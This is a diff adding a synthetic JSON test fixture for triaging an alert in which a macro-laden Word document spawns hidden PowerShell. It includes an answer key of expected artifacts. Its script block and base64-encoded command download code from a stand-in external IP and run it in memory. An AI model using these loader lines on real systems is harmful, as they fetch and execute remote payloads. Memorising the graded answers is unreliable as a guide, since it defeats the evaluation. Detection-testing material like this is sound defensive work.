@@ -1,0 +1,193 @@
+{
+  "name": "synthetic_malicious_fileless_script",
+  "note": "SYNTHETIC. The payload runs in memory: the script block is the only evidence of what was executed, so a materiality rule must keep it. A second, routine script of the same user is noise.",
+  "alert_text": {
+    "title": "Office application spawned PowerShell",
+    "severity": "high",
+    "host": "WS-FIN-07",
+    "description": "WINWORD.EXE started powershell.exe with a hidden window and an encoded command.",
+    "trigger_entities": [
+      "proc:winword-2210",
+      "proc:powershell-6630",
+      "host:WS-FIN-07"
+    ]
+  },
+  "entities": {
+    "host:WS-FIN-07": {
+      "type": "host",
+      "hostname": "WS-FIN-07",
+      "role": "workstation",
+      "ip": "10.0.30.17",
+      "domain": "corp.example"
+    },
+    "user:lena.ortiz": {
+      "type": "windows_user",
+      "username": "lena.ortiz",
+      "domain": "CORP",
+      "account_type": "user",
+      "department": "Finance"
+    },
+    "proc:winword-2210": {
+      "type": "windows_process",
+      "image_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "cmdline": "\"WINWORD.EXE\" /n \"C:\\Users\\lena.ortiz\\Downloads\\Remittance_4471.docm\"",
+      "user": "CORP\\lena.ortiz",
+      "integrity_level": "medium",
+      "signed": true,
+      "signer": "Microsoft Corporation"
+    },
+    "file:remittance-docm": {
+      "type": "windows_file",
+      "path": "C:\\Users\\lena.ortiz\\Downloads\\Remittance_4471.docm",
+      "zone_identifier": 3,
+      "sha256": "9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a9a",
+      "has_macros": true
+    },
+    "proc:powershell-6630": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADQANQAvAHMAJwApAA==",
+      "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "user": "CORP\\lena.ortiz",
+      "integrity_level": "medium",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "script:ps-block-6630": {
+      "type": "powershell_script",
+      "script_block_id": "7c1e0b52-3f0a-4d8e-9a55-1b2c3d4e5f60",
+      "process_id": 6630,
+      "script_block_text": "$b=(New-Object Net.WebClient).DownloadData('https://203.0.113.45/p.bin'); $a=[System.Reflection.Assembly]::Load($b); $a.EntryPoint.Invoke($null,@(,[string[]]@()))",
+      "path": null
+    },
+    "cmdlet:ps-6630-newobject": {
+      "type": "powershell_cmdlet_invocation",
+      "cmdlet": "New-Object",
+      "arguments": "Net.WebClient",
+      "process_id": 6630
+    },
+    "net:c2-443": {
+      "type": "network_connection",
+      "src_ip": "10.0.30.17",
+      "dst_ip": "203.0.113.45",
+      "dst_port": 443,
+      "protocol": "tcp",
+      "direction": "outbound",
+      "bytes_out": 2104,
+      "bytes_in": 184320
+    },
+    "host:ext-203.0.113.45": {
+      "type": "host",
+      "ip": "203.0.113.45",
+      "role": "external",
+      "first_seen_in_org": "on the alert day"
+    },
+    "proc:powershell-1180": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "cmdline": "powershell.exe -NoLogo",
+      "parent_image": "C:\\Windows\\explorer.exe",
+      "user": "CORP\\lena.ortiz",
+      "integrity_level": "medium",
+      "signed": true
+    },
+    "script:ps-profile-1180": {
+      "type": "powershell_script",
+      "script_block_id": "0f0e0d0c-0b0a-0908-0706-050403020100",
+      "process_id": 1180,
+      "script_block_text": "Set-PSReadLineOption -EditMode Windows; Import-Module FinanceReports",
+      "path": "C:\\Users\\lena.ortiz\\Documents\\WindowsPowerShell\\profile.ps1"
+    }
+  },
+  "relations": {
+    "rel:lena-runs-word": {
+      "type": "runs_process",
+      "source": "user:lena.ortiz",
+      "target": "proc:winword-2210"
+    },
+    "rel:word-read-doc": {
+      "type": "read_file",
+      "source": "proc:winword-2210",
+      "target": "file:remittance-docm"
+    },
+    "rel:word-spawned-ps": {
+      "type": "win_process_create",
+      "source": "proc:winword-2210",
+      "target": "proc:powershell-6630"
+    },
+    "rel:ps-ran-block": {
+      "type": "executed_script",
+      "source": "proc:powershell-6630",
+      "target": "script:ps-block-6630"
+    },
+    "rel:ps-invoked-newobject": {
+      "type": "invoked_cmdlet",
+      "source": "proc:powershell-6630",
+      "target": "cmdlet:ps-6630-newobject"
+    },
+    "rel:ps-connected": {
+      "type": "connected_to",
+      "source": "proc:powershell-6630",
+      "target": "net:c2-443"
+    },
+    "rel:conn-remote-host": {
+      "type": "connection_to_host",
+      "source": "net:c2-443",
+      "target": "host:ext-203.0.113.45"
+    },
+    "rel:lena-runs-shell": {
+      "type": "runs_process",
+      "source": "user:lena.ortiz",
+      "target": "proc:powershell-1180"
+    },
+    "rel:shell-ran-profile": {
+      "type": "executed_script",
+      "source": "proc:powershell-1180",
+      "target": "script:ps-profile-1180"
+    }
+  },
+  "expected": {
+    "verdict": "malicious",
+    "artifacts": [
+      {
+        "entity_id": "host:WS-FIN-07",
+        "kind": "host_to_isolate"
+      },
+      {
+        "entity_id": "user:lena.ortiz",
+        "kind": "identity_to_rotate"
+      },
+      {
+        "entity_id": "file:remittance-docm",
+        "kind": "file_to_delete"
+      },
+      {
+        "entity_id": "proc:powershell-6630",
+        "kind": "process_observed"
+      },
+      {
+        "entity_id": "host:ext-203.0.113.45",
+        "kind": "network_block"
+      }
+    ],
+    "critical": [
+      {
+        "entity_id": "host:WS-FIN-07",
+        "kind": "host_to_isolate"
+      }
+    ],
+    "must_see": [
+      "script:ps-block-6630"
+    ],
+    "forbidden_artifacts": [
+      "script:ps-profile-1180",
+      "proc:powershell-1180"
+    ],
+    "forbidden_kinds": [
+      {
+        "entity_id": "proc:winword-2210",
+        "kind": "file_to_delete"
+      }
+    ]
+  }
+}
